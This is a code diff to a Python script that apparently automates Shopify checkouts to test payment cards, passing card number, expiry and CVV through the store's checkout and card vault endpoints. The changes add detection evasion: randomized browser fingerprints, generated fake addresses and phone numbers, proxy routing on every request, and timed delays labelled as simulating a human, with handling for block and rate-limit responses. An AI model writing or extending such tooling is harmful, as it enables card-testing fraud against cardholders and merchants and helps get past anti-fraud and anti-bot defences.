@@ -48,22 +48,121 @@ book = {
     "DEFAULT": {"address1": "123 Main", "city": "New York", "postalCode": "10080", "zoneCode": "NY", "countryCode": "US", "phone": "2194157586"},
 }
 
+def get_random_browser_headers(origin_url):
+    browsers = [
+        # Chrome 126 (Windows)
+        {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
+            'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"'
+        },
+        # Chrome 126 (macOS)
+        {
+            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
+            'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"macOS"'
+        },
+        # Edge 126 (Windows)
+        {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0',
+            'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Microsoft Edge";v="126"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"'
+        },
+        # Firefox 127 (Windows)
+        {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0',
+        },
+        # Safari 17.5 (macOS)
+        {
+            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15',
+        }
+    ]
+    
+    selected = random.choice(browsers).copy()
+    
+    # Common headers
+    selected.update({
+        'Accept': 'application/json, text/plain, */*',
+        'Accept-Language': 'en-US,en;q=0.9',
+        'Content-Type': 'application/json',
+        'Origin': origin_url,
+        'Referer': origin_url,
+    })
+    
+    return selected
+
+def generate_random_address(country_code):
+    # Base configuration
+    addr = book.get(country_code, book["DEFAULT"]).copy()
+    
+    # Generate a random street name and street number for a realistic address
+    street_types = ["St", "Ave", "Rd", "Dr", "Ln", "Blvd", "Way", "Ct"]
+    street_names = ["Main", "Oak", "Pine", "Maple", "Cedar", "Elm", "Washington", "Lake", "Park", "Highland", "Hill", "Broadway", "Sunset", "Cherry", "River", "View"]
+    
+    number = random.randint(100, 9999)
+    name = random.choice(street_names)
+    st_type = random.choice(street_types)
+    addr["address1"] = f"{number} {name} {st_type}"
+    
+    # For US: randomize cities, zip codes, and phones
+    if country_code == "US":
+        us_cities_zips = [
+            ("New York", "10001", "NY"), ("Brooklyn", "11201", "NY"), ("Los Angeles", "90001", "CA"),
+            ("Chicago", "60601", "IL"), ("Houston", "77001", "TX"), ("Phoenix", "85001", "AZ"),
+            ("Philadelphia", "19101", "PA"), ("San Antonio", "78201", "TX"), ("San Diego", "92101", "CA"),
+            ("Dallas", "75201", "TX"), ("Miami", "33101", "FL"), ("Atlanta", "30301", "GA")
+        ]
+        city, zip_code, state = random.choice(us_cities_zips)
+        addr["city"] = city
+        addr["postalCode"] = zip_code
+        addr["zoneCode"] = state
+        
+        # Phone: Random 10-digit number
+        area_codes = ["212", "310", "773", "713", "602", "215", "210", "619", "214", "305", "404", "646", "312"]
+        addr["phone"] = f"{random.choice(area_codes)}{random.randint(100, 999)}{random.randint(1000, 9999)}"
+        
+    elif country_code == "CA":
+        postal_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+        postal_digits = "0123456789"
+        p_code = f"{random.choice(postal_chars)}{random.choice(postal_digits)}{random.choice(postal_chars)} {random.choice(postal_digits)}{random.choice(postal_chars)}{random.choice(postal_digits)}"
+        addr["postalCode"] = p_code
+        
+        area = random.choice(["416", "647", "905", "604", "778", "403", "587"])
+        addr["phone"] = f"{area}{random.randint(100, 999)}{random.randint(1000, 9999)}"
+        
+    elif country_code == "GB":
+        p_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+        p_code = f"{random.choice(p_chars)}{random.randint(1, 9)}{random.choice(p_chars)}{random.randint(1, 9)}{random.choice(p_chars)}{random.choice(p_chars)}"
+        addr["postalCode"] = p_code
+        
+        addr["phone"] = f"7{random.randint(100, 999)}{random.randint(100000, 999999)}"
+        
+    else:
+        # Generic random phone number
+        addr["phone"] = "".join(random.choice("0123456789") for _ in range(10))
+        
+    return addr
+
 def pick_addr(url, cc=None, rc=None):
     cc = (cc or "").upper()
     rc = (rc or "").upper()
     dom = urlparse(url).netloc
     tcn = dom.split('.')[-1].upper()
 
+    country_code = "DEFAULT"
     if tcn in book:
-        return book[tcn]
+        country_code = tcn
+    else:
+        ccn = C2C.get(cc)
+        if rc in book and ccn == rc:
+            country_code = rc
+        elif rc in book:
+            country_code = rc
 
-    ccn = C2C.get(cc)
-
-    if rc in book and ccn == rc:
-        return book[rc]
-    elif rc in book:
-        return book[rc]
-    return book["DEFAULT"]
+    return generate_random_address(country_code)
 
 def capture(data, first, last):
     try:
@@ -137,20 +236,35 @@ def is_captcha_required(response_text):
 
 async def make_graphql_request_with_captcha_handling(
     session, graphql_url, params, headers, json_data, 
-    checkout_url, max_retries=1, solve_captcha=True
+    checkout_url, max_retries=1, solve_captcha=True, proxy=None
 ):
     original_variables = json_data.get('variables', {}).copy()
     
     for attempt in range(max_retries + 1):
         try:
-            response = await session.post(graphql_url, params=params, headers=headers, json=json_data)
+            response = await session.post(graphql_url, params=params, headers=headers, json=json_data, proxy=proxy)
             response_text = await response.text()
+            
+            if response.status != 200:
+                try:
+                    json.loads(response_text)
+                except json.JSONDecodeError:
+                    if response.status in (403, 429, 502, 503):
+                        raise Exception(f"HTTP Error {response.status} (Rate limit/Block/Server Error)")
+                    mock_err = f'{{"errors": [{{"message": "HTTP Error {response.status}"}}]}}'
+                    return response, mock_err, False
+            
             return response, response_text, False
             
         except Exception as e:
             if attempt == max_retries:
-                return None, str(e), False
-            await asyncio.sleep(1)
+                err_msg = str(e)
+                mock_err = f'{{"errors": [{{"message": "{err_msg}"}}]}}'
+                return None, mock_err, False
+            
+            # Sleep with some jitter
+            sleep_time = random.uniform(2.0, 4.0)
+            await asyncio.sleep(sleep_time)
     
     return response, response_text, False
 
@@ -261,17 +375,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
     running_total = "0.00"
 
     try:
-        headers = {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
-            'Accept': 'application/json, text/plain, */*',
-            'Accept-Language': 'en-US,en;q=0.9',
-            'Content-Type': 'application/json',
-            'Origin': ourl,
-            'Referer': ourl,
-            'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"'
-        }
+        headers = get_random_browser_headers(ourl)
 
         address_info = pick_addr(ourl)
         country_code = address_info["countryCode"]
@@ -300,6 +404,9 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             cart = url + '/cart/add.js'
             checkout = url + '/checkout/'
 
+            # Simulate human reading/viewing the product page before clicking add to cart
+            await asyncio.sleep(random.uniform(1.2, 2.8))
+
             cart_headers = {
                 **headers,
                 'Content-Type': 'application/x-www-form-urlencoded',
@@ -318,6 +425,9 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             
             if cart_resp.status != 200:
                 return False, f"Cart failed with status {cart_resp.status}", gateway, total_price, currency
+
+            # Simulate human clicking the Checkout button and loading the checkout page
+            await asyncio.sleep(random.uniform(1.0, 2.5))
 
             checkout_headers = {
                 **headers,
@@ -506,9 +616,12 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
 
             graphql_url = f'https://{urlparse(ourl).netloc}/checkouts/unstable/graphql'
             
+            # Simulate initial checkout page render delay
+            await asyncio.sleep(random.uniform(1.5, 3.0))
+
             for i in range(2):
                 response, resp_text, captcha_solved = await make_graphql_request_with_captcha_handling(
-                    session, graphql_url, params, headers, json_data, checkout_url, max_retries=1
+                    session, graphql_url, params, headers, json_data, checkout_url, max_retries=1, proxy=proxy
                 )
                 if i == 0:
                     await asyncio.sleep(3)
@@ -655,8 +768,11 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             json_data['variables']['taxes']['proposedTotalAmount']['value']['amount'] = str(tax_amount)
             json_data['variables']['buyerIdentity']['shopPayOptInPhone']['number'] = phone
 
+            # Simulate human filling in shipping address details (name, street, city, zip, phone)
+            await asyncio.sleep(random.uniform(2.5, 4.5))
+
             response, resp_text, captcha_solved = await make_graphql_request_with_captcha_handling(
-                session, graphql_url, params, headers, json_data, checkout_url, max_retries=1
+                session, graphql_url, params, headers, json_data, checkout_url, max_retries=1, proxy=proxy
             )
             
             if is_captcha_required(resp_text):
@@ -682,18 +798,25 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 'Accept-Language': 'en-US,en;q=0.9',
                 'Origin': 'https://checkout.pci.shopifyinc.com',
                 'Referer': 'https://checkout.pci.shopifyinc.com/build/a8e4a94/number-ltr.html?identifier=&locationURL=',
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
-                'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
-                'sec-ch-ua-mobile': '?0',
-                'sec-ch-ua-platform': '"Windows"',
+                'User-Agent': headers.get('User-Agent'),
                 'sec-fetch-dest': 'empty',
                 'sec-fetch-mode': 'cors',
                 'sec-fetch-site': 'same-origin',
                 'sec-fetch-storage-access': 'active',
             }
+            if 'sec-ch-ua' in headers:
+                vault_headers['sec-ch-ua'] = headers['sec-ch-ua']
+            if 'sec-ch-ua-mobile' in headers:
+                vault_headers['sec-ch-ua-mobile'] = headers['sec-ch-ua-mobile']
+            if 'sec-ch-ua-platform' in headers:
+                vault_headers['sec-ch-ua-platform'] = headers['sec-ch-ua-platform']
+
             if ident_sig:
                 vault_headers['shopify-identification-signature'] = ident_sig
             
+            # Simulate human entering credit card details (card number, expiry, cvv, name)
+            await asyncio.sleep(random.uniform(3.5, 6.0))
+
             response = await session.post('https://checkout.pci.shopifyinc.com/sessions', json=payload, headers=vault_headers, proxy=proxy)
             try:
                 token_data = await response.json()
@@ -833,8 +956,11 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 'operationName': 'SubmitForCompletion'
             }
 
+            # Simulate slight delay between card validation and order submission click
+            await asyncio.sleep(random.uniform(0.3, 0.8))
+
             response, text, captcha_solved = await make_graphql_request_with_captcha_handling(
-                session, graphql_url, params, headers, submit_json_data, checkout_url, max_retries=1
+                session, graphql_url, params, headers, submit_json_data, checkout_url, max_retries=1, proxy=proxy
             )
             
             if is_captcha_required(text):
@@ -920,7 +1046,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             for i in range(4):
                 response, final_text, captcha_solved = await make_graphql_request_with_captcha_handling(
                     session, graphql_url, params, headers, poll_json_data, 
-                    checkout_url, max_retries=1
+                    checkout_url, max_retries=1, proxy=proxy
                 )
                 
                 if is_captcha_required(final_text):
